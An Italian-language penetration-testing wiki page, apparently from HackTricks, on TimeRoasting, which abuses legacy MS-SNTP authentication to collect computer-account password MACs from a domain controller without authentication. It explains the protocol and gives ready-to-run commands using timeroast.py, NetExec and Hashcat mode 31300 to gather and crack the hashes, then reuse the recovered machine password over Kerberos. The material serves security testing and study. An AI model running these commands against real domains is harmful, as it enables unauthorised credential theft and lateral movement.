# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting sfrutta l'autenticazione legacy MS-SNTP. Un client non autenticato può inviare una richiesta di 68 byte contenente un RID scelto dell'account computer. Nel percorso legacy vulnerabile, il domain controller deriva l'autenticatore della risposta tramite Netlogon usando l'hash NT dell'account computer (il secret della password derivato da MD4), fornendo all'attaccante una coppia challenge/MAC adatta al password guessing offline (modalità 31300 di Hashcat).<sup>[[1]](#references)[[2]](#references)</sup>

Le sezioni 3.1.5.1 e 4 di MS-SNTP descrivono il comportamento della richiesta e della risposta:<sup>[[1]](#references)</sup>
![TimeRoasting: consulta la sezione 3.1.5.1 "Authentication Request Behavior" e la sezione 4 "Protocol Examples" della specifica ufficiale MS-SNTP per i dettagli](../../images/Pasted%20image%2020250709114508.png)
Quando `ExtendedAuthenticatorSupported` è false, la richiesta memorizza il RID nei 31 bit meno significativi del Key Identifier dell'autenticatore e un bit selettore nel bit più significativo. Il server verifica la lunghezza di 68 byte, estrae il RID, chiede a Netlogon di calcolare i checksum candidati, ne seleziona uno usando quel bit più significativo, azzera il Key Identifier della risposta e restituisce il checksum selezionato.<sup>[[1]](#references)</sup>

Il crypto-checksum è basato su MD5 (vedi 3.2.5.1.1) e può essere craccato offline, rendendo possibile l'attacco di roasting.<sup>[[1]](#references)</sup>

## Come attaccare

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Script di Timeroasting di Tom Tervoort<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Attacco pratico (non autenticato) con NetExec + Hashcat

- Il modulo `timeroast` di NetExec può enumerare i RID dei computer, raccogliere i MAC MS-SNTP senza autenticazione e stampare gli hash `$sntp-ms$` pronti per il cracking:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Crack offline con Hashcat mode 31300 (MS-SNTP MAC):<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- La password in chiaro recuperata corrisponde alla password di un account computer. Provala direttamente come account macchina usando Kerberos (-k) quando NTLM è disabilitato:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
### Note operative
- Assicurati che l'ora sia accurata prima di usare le credenziali recuperate con Kerberos. Preferisci un client NTP mantenuto, come `chronyd`/`systemd-timesyncd`; `ntpdate` viene mantenuto qui come comando comune nei lab: `sudo ntpdate <dc_fqdn>`.
- Se necessario, genera krb5.conf per il realm AD: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Mappa in seguito i RID ai principal tramite LDAP/BloodHound, una volta ottenuto un foothold autenticato.

## References

- [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – whitepaper su Timeroasting](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec — sorgente del modulo `timeroast`](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/timeroast.py)
- [5] [Modalità Hashcat 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../banners/hacktricks-training.md}}
